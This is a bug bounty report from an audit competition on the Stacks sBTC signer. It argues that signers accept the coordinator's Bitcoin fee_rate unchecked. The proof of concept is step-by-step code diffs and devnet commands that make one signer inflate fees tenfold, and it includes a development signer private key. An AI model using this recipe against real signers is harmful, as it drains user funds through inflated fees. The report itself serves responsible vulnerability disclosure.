# #38460 \[BC-Low] The coordinator can set a higher BTC tx fee than the current network to make users t

**Submitted on Jan 3rd 2025 at 22:44:27 UTC by @f4lc0n for** [**Attackathon | Stacks**](https://immunefi.com/audit-competition/stacks-attackathon-1)

* **Report ID:** #38460
* **Report Type:** Blockchain/DLT
* **Report severity:** Low
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_0.9/signer>
* **Impacts:**
  * Direct loss of funds

## Description

## Brief/Intro

When a signer acts as a coordinator, he will initiate BTC transactions to transfer the deposited BTC to the signer's multi-wallet.

The problem now is that signers do not check the `fee_rate` of the BTC transaction set by the coordinator. Therefore, a malicious signer can set a higher `fee_rate` to make users pay more fees.

## Vulnerability Details

The `signer/src/bitcoin/validation.rs::construct_package_sighashes` code is as follows.

```rust
    pub async fn construct_package_sighashes<C>(
        &self,
        ctx: &C,
        btc_ctx: &BitcoinTxContext,
    ) -> Result<Vec<BitcoinTxValidationData>, Error>
    where
        C: Context + Send + Sync,
    {
        let cache = self.fetch_all_reports(&ctx.get_storage(), btc_ctx).await?;

        self.pre_validation(ctx, &cache).await?;

        let signer_utxo = ctx
            .get_storage()
            .get_signer_utxo(&btc_ctx.chain_tip)
            .await?
            .ok_or(Error::MissingSignerUtxo)?;

        let mut signer_state = SignerBtcState {
            fee_rate: self.fee_rate,
            utxo: signer_utxo,
            public_key: bitcoin::XOnlyPublicKey::from(btc_ctx.aggregate_key),
            last_fees: self.last_fees,
            magic_bytes: [b'T', b'3'], //TODO(#472): Use the correct magic bytes.
        };
        let mut outputs = Vec::new();

        for requests in self.request_package.iter() {
            let (output, new_signer_state) = self
                .construct_tx_sighashes(ctx, btc_ctx, requests, signer_state, &cache)
                .await?;
            signer_state = new_signer_state;
            outputs.push(output);
        }

        Ok(outputs)
    }
```

It directly uses the `fee_rate` passed by the coordinator without checking it. Then the coordinator can send a `fee_rate` higher than the current main network to make users to consume more fees.

## Fix

Check the `fee_rate` provided by the coordinator to make sure it is not much higher than the current mainnet.

## Impact Details

Users usually set a transaction fee higher than the current mainnet to ensure that their deposits are executed. The remaining transaction fees will normally be returned to the user in the form of sBTC. Attackers can use this bug to make users lose this part of the redundant transaction fees.

However, the user's loss is limited, so I think the bug is **Medium**.

## References

None

## Proof of Concept

## Proof of Concept

1. Base on: <https://github.com/stacks-network/sbtc/releases/tag/0.0.9-rc4>
2. Patch `signer/src/config/mod.rs`, add attacker flag config

   ```diff
        /// The minimum bitcoin block height for which the sbtc signers will
        /// backfill bitcoin blocks to.
        pub sbtc_bitcoin_start_height: Option<u64>,
   +    /// @audit;
   +    pub audit_this_signer_is_attacker: Option<bool>,
    }
    
    impl Validatable for SignerConfig {
   ```
3. Patch `signer/src/main.rs`, load attacker flag

   ```diff
        );
    
        // Load the configuration file and/or environment variables.
   -    let settings = Settings::new(args.config)?;
   +    let mut settings = Settings::new(args.config)?;
   +    std::thread::sleep(std::time::Duration::from_millis(2000)); // wait for the `docker logs` command
   +    settings.signer.audit_this_signer_is_attacker = match std::env::var("AUDIT_THIS_SIGNER_IS_ATTACKER") {
   +        Ok(value) => Some(value.parse::<bool>().unwrap()),
   +        _ => Some(false),
   +    };
   +    tracing::info!("@audit; audit_this_signer_is_attacker: {:?}", settings.signer.audit_this_signer_is_attacker);
        signer::metrics::setup_metrics(settings.signer.prometheus_exporter_endpoint);
    
        // Open a connection to the signer db.
   ```
4. Patch `docker/docker-compose.yml`, add attacker flag

   ```diff
          - postgres-3
        environment:
          <<: *sbtc-signer-environment
   +      AUDIT_THIS_SIGNER_IS_ATTACKER: true
          SIGNER_SIGNER__DB_ENDPOINT: postgresql://postgres:postgres@postgres-3:5432/signer
          SIGNER_SIGNER__PRIVATE_KEY: 3ec0ca5770a356d6cd1a9bfcbf6cd151eb1bd85c388cc00648ec4ef5853fdb7401
          SIGNER_SIGNER__P2P__SEEDS: tcp://sbtc-signer-1:4122,tcp://sbtc-signer-2:4122
   ```
5. Patch `signer/src/transaction_coordinator.rs`, add attack action. It will set 10x `fee_rate`.

   ```diff
            let pending_requests_fut =
                self.get_pending_requests(bitcoin_chain_tip, aggregate_key, signer_public_keys);
    
            // If Self::get_pending_requests returns Ok(None) then there are no
            // requests to respond to, so let's just exit.
   -        let Some(pending_requests) = pending_requests_fut.await? else {
   +        let Some(mut pending_requests) = pending_requests_fut.await? else {
                tracing::debug!("no requests to handle, exiting");
                return Ok(());
            };
   +        // @audit; begin
   +        let this_signer_is_attacker = self.context.config().signer.audit_this_signer_is_attacker.is_some_and(|x| x);
   +        if this_signer_is_attacker {
   +            pending_requests.signer_state.fee_rate *= 10 as f64;
   +        }
   +        // @audit; end
            tracing::debug!(
                num_deposits = %pending_requests.deposits.len(),
                num_withdrawals = pending_requests.withdrawals.len(),
                "fetched requests"
            );
            // Construct the transaction package and store it in the database.
   ```
6. Run docker

   ```sh
   make devenv-up
   make devenv-down
   docker compose -f docker/docker-compose.yml --profile default --profile bitcoin-mempool --profile sbtc-signer build
   make devenv-up
   ```
7. Add [this code](https://gist.github.com/al-f4lc0n/6befe01b89669cfb756cf747d7cf030d) to `signer/src/bin/poc9.rs`
8. Patch `signer/Cargo.toml`, add `poc9` bin

   ```diff
   +[[bin]]
   +name = "poc9"
   +path = "src/bin/poc9.rs"
   ```
9. Waiting for the sBTC contract to be deployed. Then run the `poc9` tool. It will send 40 BTC to the signers BTC address and trigger deposits every 10 seconds.

   ```sh
   cargo run -p signer --bin poc9
   ```
10. Wait until the trigger the coordinator is *sbtc-signer-3*.
11. In [BTC explorer](http://localhost:8083/), you will find that the transaction initiated by *sbtc-signer-3* consumes more transaction fees (x10) than other transactions.
